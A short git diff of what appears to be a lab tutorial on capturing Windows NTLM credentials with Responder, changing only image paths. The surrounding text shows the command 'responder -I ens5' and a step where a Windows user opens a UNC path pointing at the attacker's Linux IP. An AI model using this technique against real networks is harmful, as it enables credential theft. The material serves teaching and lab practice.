@@ -34,11 +34,11 @@ responder -I ens5
 
 You should see this:
 
-![](attachments/responderrunning.png)
+![](./attachments/responderrunning.png)
 
 Let's open **Windows File Explorer** and put in the string **"\\<Linux-IP>\Noooo"** into the address bar at the top.
 
-![](attachments/OpeningFileExplorer.png)
+![](./attachments/OpeningFileExplorer.png)
 
 ![](attachments/noooaccessbar.png)
 
